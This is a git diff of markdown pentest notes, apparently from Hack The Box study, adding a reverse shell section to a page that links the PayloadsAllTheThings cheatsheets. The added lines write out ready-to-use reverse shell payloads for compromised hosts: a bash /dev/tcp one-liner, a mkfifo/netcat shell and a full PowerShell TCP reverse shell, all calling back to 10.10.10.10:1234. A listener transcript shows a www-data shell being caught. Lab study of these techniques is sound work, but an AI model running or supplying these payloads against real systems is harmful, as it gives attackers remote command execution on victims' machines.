@@ -558,17 +558,44 @@ favicon: https://github.githubassets.com/favicons/favicon.svg
 image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
 ```
 
+The below commands are reliable commands we can use to get a reverse connection, for `bash` on Linux compromised hosts and `Powershell` on Windows compromised hosts:
+
+Code: bash
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 
+Code: bash
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 
+Code: powershell
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
+```shell
+k3shi@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 ## Bind Shell
+
+```cardlink
+url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
+title: "PayloadsAllTheThings/Methodology and Resources/Bind Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings"
+description: "A list of useful payloads and bypass for Web Application Security and Pentest/CTF - swisskyrepo/PayloadsAllTheThings"
+host: github.com
+favicon: https://github.githubassets.com/favicons/favicon.svg
+image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
+```
+
+
+
 
